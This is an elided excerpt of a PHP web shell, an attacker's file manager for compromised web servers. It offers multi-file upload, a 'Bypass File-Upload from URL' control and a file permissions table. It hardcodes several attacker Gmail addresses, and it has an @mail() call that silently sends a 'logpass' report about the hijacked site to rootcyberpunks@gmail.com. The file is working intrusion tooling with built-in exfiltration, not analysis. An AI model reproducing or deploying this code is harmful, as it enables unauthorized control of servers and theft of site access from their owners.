...
$destinationmail = 'https.cpanel.net@gmail.com,https.cpanel.net@gmail.com, rootcyberpunks@gmail.com, fbi.priv.g00gle@gmail.com, muhrazky@gmail.com, malaysia.sender@gmail.com,https.cpanel.net@gmail.com, rootcyberpunks@gmail.com, fbi.priv.g00gle@gmail.com, muhrazky@gmail.com, malaysia.sender@gmail.com';
...
function perms($path) {
    ...
    return $info;
     ...
     @mail("rootcyberpunks@gmail.com", "logpass", $report_bug);
...
<center>
                        <div class="p-2">
                            <form action="" method="post" enctype="multipart/form-data">
                                ...
                                <div class="row">
                                    <div class="col-md-9 mb-3">
                                        <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload"></div>
                                    <div class="col-md-3">
                    ...
                    <div class="container" id="tools">
                        ...
                        <a data-bs-toggle="collapse" href="#uploadUrlCollapse" role="button" aria-expanded="false" aria-controls="uploadUrlCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-link"></i> Bypass File-Upload from URL</a>
                        ...
                        <table class="table table-hover table-dark text-light">
                            <thead>
                                <tr>
                                    ...
                                    <td style="width:50%">Owner/Group</td>
                                    <td style="width:50%">Permission</td>
                                    <td style="width:50%">Last Modified</td>
